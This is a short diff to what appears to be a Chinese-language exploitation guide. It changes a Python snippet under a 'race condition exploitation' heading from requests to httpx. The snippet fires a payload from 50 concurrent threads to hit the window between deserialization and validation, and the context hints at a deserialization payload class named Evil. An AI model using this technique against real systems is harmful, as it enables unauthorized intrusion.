@@ -134,12 +134,12 @@ class Evil:
 ## 竞态条件利用
 
 ```python
-import requests
+import httpx
 import threading
 
 def exploit():
     # 在反序列化与验证之间的时间窗口
-    r = requests.post(url, data=payload)
+    r = httpx.post(url, content=payload)
     
 # 并发发送
 threads = [threading.Thread(target=exploit) for _ in range(50)]
